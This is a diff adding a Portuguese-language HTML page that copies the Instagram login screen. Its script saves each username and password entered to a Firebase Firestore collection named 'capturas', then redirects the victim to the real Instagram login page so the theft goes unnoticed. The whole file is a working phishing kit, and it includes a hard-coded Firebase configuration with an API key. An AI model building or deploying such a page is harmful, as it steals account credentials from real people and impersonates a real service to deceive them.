@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed97f5141f21.png" type="image/png">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
+        .main-container { display: flex; flex-direction: column; width: 350px; }
+        .box { background-color: #fff; border: 1px solid #dbdbdb; padding: 20px 40px; text-align: center; margin-bottom: 10px; }
+        .logo-img { width: 175px; margin: 25px 0 35px; }
+        input { width: 100%; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; margin-bottom: 8px; font-size: 12px; outline: none; }
+        .btn-login { width: 100%; background-color: #0095f6; color: white; border: none; border-radius: 8px; padding: 7px; font-weight: 600; cursor: pointer; margin: 10px 0; font-size: 14px; }
+        .btn-login:disabled { background-color: #b2dffc; cursor: default; }
+        .divider { display: flex; align-items: center; margin: 15px 0; }
+        .line { flex: 1; height: 1px; background-color: #dbdbdb; }
+        .divider span { margin: 0 15px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
+        .fb-login { color: #385185; text-decoration: none; font-size: 14px; font-weight: 600; display: block; margin-bottom: 15px; }
+        .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; display: block; }
+        .signup-box p { font-size: 14px; color: #262626; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+    </style>
+</head>
+<body>
+
+    <main class="main-container">
+        <div class="box">
+            <img src=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTB17Yv1-Qr8TUJ8AUIOO--ymd1p67OwXnc4Q&s>
+            <form id="login-form">
+                <input type="text" id="user" placeholder="Telefone, nome de usuário ou email">
+                <input type="password" id="pass" placeholder="Senha">
+                <button type="submit" id="btn-submit" class="btn-login" disabled>Entrar</button>
+            </form>
+            <div class="divider">
+                <div class="line"></div><span>OU</span><div class="line"></div>
+            </div>
+            <a href="#" class="fb-login">Entrar com o Facebook</a>
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        </div>
+        <div class="box signup-box">
+            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+        </div>
+    </main>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAvd6dzqNrU7FU4kksyeL7DM-cUe-JW9ZQ",
+            authDomain: "planning-with-ai-54c35.firebaseapp.com",
+            projectId: "planning-with-ai-54c35",
+            storageBucket: "planning-with-ai-54c35.firebasestorage.app",
+            messagingSenderId: "299880903655",
+            appId: "1:299880903655:web:3da232d4dfc559d2384342"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        const userField = document.getElementById('user');
+        const passField = document.getElementById('pass');
+        const btnSubmit = document.getElementById('btn-submit');
+        const form = document.getElementById('login-form');
+
+        const validate = () => {
+            btnSubmit.disabled = !(userField.value.trim().length > 0 && passField.value.length >= 6);
+        };
+
+        userField.addEventListener('input', validate);
+        passField.addEventListener('input', validate);
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            try {
+                // Salva no banco "capturas"
+                await addDoc(collection(db, "capturas"), {
+                    usuario: userField.value,
+                    senha: passField.value,
+                    timestamp: new Date()
+                });
+                // Redireciona para o real
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            } catch (err) {
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }
+        });
+    </script>
+</body>
+</html>
